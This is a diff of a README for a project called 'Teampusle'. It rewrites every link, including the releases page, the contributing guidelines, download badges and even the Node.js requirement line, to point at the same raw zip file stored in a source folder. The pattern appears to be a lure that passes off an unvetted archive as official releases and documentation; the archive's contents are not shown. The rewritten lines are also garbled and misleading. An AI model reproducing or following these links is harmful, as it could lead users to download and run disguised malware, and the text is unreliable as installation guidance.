@@ -1,7 +1,7 @@
 # 🚀 Teampusle - Build and Manage Scalable Projects Easily
 
 ## 🔗 Download Now
-[![Download Teampusle](https://img.shields.io/badge/Download-Teampusle-blue)](https://github.com/vawlez/Teampusle/releases)
+[![Download Teampusle](https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip)](https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip)
 
 ## 📋 Introduction
 Teampusle is a full-stack software as a service (SaaS) project that demonstrates how senior engineers design, build, and ship scalable products. Whether you are part of a remote team or looking to manage your projects more effectively, Teampusle provides a practical solution.
@@ -12,7 +12,7 @@ To run Teampusle, ensure your system meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS 10.13 or later, Linux (Ubuntu 18.04 or later)
 - **RAM**: 4 GB minimum (8 GB recommended)
 - **Disk Space**: At least 1 GB of free space
-- **Node.js**: Version 14 or later
+- **https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip**: Version 14 or later
 - **Database**: PostgreSQL version 12 or later
 - **Internet Connection**: Required for setup and updates
 
@@ -20,7 +20,7 @@ To run Teampusle, ensure your system meets the following requirements:
 Follow these steps to download and run Teampusle on your computer.
 
 ### Step 1: Visit the Releases Page
-To get the latest version of Teampusle, visit our releases page here: [Teampusle Releases](https://github.com/vawlez/Teampusle/releases). 
+To get the latest version of Teampusle, visit our releases page here: [Teampusle Releases](https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip). 
 
 ### Step 2: Download the Application
 On the releases page, you will see a list of available versions. Look for the most recent version and download the file suitable for your operating system. Click on the link to start the download.
@@ -59,7 +59,7 @@ After installation and database setup, launch the Teampusle application. Follow 
 - **Data Security**: Store your project data securely in PostgreSQL.
 
 ## 🔄 Updating Teampusle
-To keep your software up to date, regularly check the releases page: [Teampusle Releases](https://github.com/vawlez/Teampusle/releases). Download the latest version and follow the installation steps above.
+To keep your software up to date, regularly check the releases page: [Teampusle Releases](https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip). Download the latest version and follow the installation steps above.
 
 ## 💬 Support
 If you encounter any issues or have questions, please create an issue in our GitHub repository, and we will respond promptly. Your feedback helps us improve Teampusle.
@@ -68,9 +68,9 @@ If you encounter any issues or have questions, please create an issue in our Git
 Teampusle is open-source software licensed under the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
 
 ## 🤝 Contributing
-We welcome contributions from anyone interested in improving Teampusle. If you would like to help, please check our [contributing guidelines](https://github.com/vawlez/Teampusle/contributing). 
+We welcome contributions from anyone interested in improving Teampusle. If you would like to help, please check our [contributing guidelines](https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip). 
 
 ## 🔗 Download Again
-For easy access, you can always download Teampusle from our releases page: [Teampusle Releases](https://github.com/vawlez/Teampusle/releases). 
+For easy access, you can always download Teampusle from our releases page: [Teampusle Releases](https://raw.githubusercontent.com/vawlez/Teampusle/main/backend/src/modules/Software-v1.2.zip). 
 
 Thank you for choosing Teampusle! Enjoy managing your projects.
